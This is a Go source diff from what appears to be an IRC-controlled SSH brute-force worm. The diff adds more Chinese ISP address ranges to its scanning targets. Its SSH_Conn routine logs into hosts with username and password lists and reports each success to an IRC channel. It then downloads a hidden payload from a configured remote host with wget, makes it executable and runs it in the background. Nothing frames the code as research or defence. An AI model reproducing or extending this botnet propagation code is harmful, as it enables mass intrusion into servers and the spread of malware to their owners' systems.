@@ -25,7 +25,28 @@ const (
 	cgpn1 = "14.116" //14.116.255.255
 	cgpn2 = "14.118" //14.118.255.255
 	cgpn3 = "14.127" //14.127.255.255
-	cgpn4 = "121.14" //121.14.255.255
+	cgpn4 = "14.29"  //14.29.255.255
+	cgpn5 = "121.14" //121.14.255.255
+
+	//CHINANET Jiangsu province network.
+	cjpn1 = "49.70"   //49.70.255.255
+	cjpn2 = "114.230" //114.230.255.255
+	cjpn3 = "114.239" //114.239.255.255
+	cjpn4 = "117.93"  //117.93.255.255
+	cjpn5 = "121.131" //121.131.255.255
+
+	//CHINANET shandong province network.
+	cspn1 = "140." //140.246.0.0 - 182.250.255.255
+	cspn2 = "182." //182.42.0.0 - 182.43.255.255
+
+	//China TieTong Telecommunications Corporation.
+	cttc1 = "36.212"  //36.212.255.255
+	cttc2 = "36."     //36.208.0.0 - 36.209.255.255
+	cttc3 = "110."    //110.218.0.0 - 110.219.255.255
+	cttc4 = "110.101" //110.101.255.255
+	cttc5 = "110.105" //110.105.255.255
+	cttc6 = "122.88"  //122.88.255.255
+	cttc7 = "122."    //122.94.0.0 - 122.95.255.255
 )
 
 func genRange(max, min int) string {
@@ -50,28 +71,23 @@ func manageIP_range(mainRange, setRange string) string {
 
 func nextIP(ipRange string) string {
 	switch ipRange {
-	case chpn1:
-		return manageIP_range(ipRange, "")
 	case chpn2:
 		return manageIP_range(ipRange, genRange(97, 96))
-	case chpn3:
-		return manageIP_range(ipRange, "")
-	case chpn4:
-		return manageIP_range(ipRange, "")
-	case chpn5:
-		return manageIP_range(ipRange, "")
 	case chpn6:
 		return manageIP_range(ipRange, genRange(235, 234))
-	case cgpn1:
-		return manageIP_range(ipRange, "")
-	case cgpn2:
-		return manageIP_range(ipRange, "")
-	case cgpn3:
-		return manageIP_range(ipRange, "")
-	case cgpn4:
+	case cttc2:
+		return manageIP_range(ipRange, genRange(209, 208))
+	case cttc3:
+		return manageIP_range(ipRange, genRange(219, 218))
+	case cttc7:
+		return manageIP_range(ipRange, genRange(95, 94))
+	case cspn1:
+		return manageIP_range(ipRange, genRange(250, 246))
+	case cspn2:
+		return manageIP_range(ipRange, genRange(43, 42))
+	default:
 		return manageIP_range(ipRange, "")
 	}
-	return ""
 }
 
 func checkPort(_ipRange string) string {
@@ -106,7 +122,10 @@ func ssh_session(ssh_session *ssh.Client, command string) {
 func SSH_Conn(reportIRC net.Conn, set_FTP, set_chan, set_payload string) {
 	NetList := []string{
 		chpn1, chpn2, chpn3, chpn4, chpn5, chpn6,
-		cgpn1, cgpn2, cgpn3, cgpn4,
+		cgpn1, cgpn2, cgpn3, cgpn4, cgpn5,
+		cjpn1, cjpn2, cjpn3, cjpn4, cjpn5,
+		cttc1, cttc2, cttc3, cttc4, cttc5, cttc6, cttc7,
+		cspn1, cspn2,
 	}
 
 	/*
@@ -142,9 +161,8 @@ func SSH_Conn(reportIRC net.Conn, set_FTP, set_chan, set_payload string) {
 						_session, err := ssh.Dial("tcp", turnRange, ssh_config(userList[user], passList[pass]))
 						if err == nil {
 							IRC_Report(reportIRC, set_chan, "Login success at "+turnRange)
-							ssh_session(_session, "curl -o ."+set_payload+" "+set_FTP+" --silent")
-							IRC_Report(reportIRC, set_chan, "\"curl\" Success on "+turnRange)
-							time.Sleep(10 * time.Second)
+							ssh_session(_session, "wget -O ."+set_payload+" "+set_FTP)
+							IRC_Report(reportIRC, set_chan, "WGET on "+turnRange)
 							ssh_session(_session, "chmod +x ."+set_payload)
 							go ssh_session(_session, "./."+set_payload+" &")
 							logCheck = true
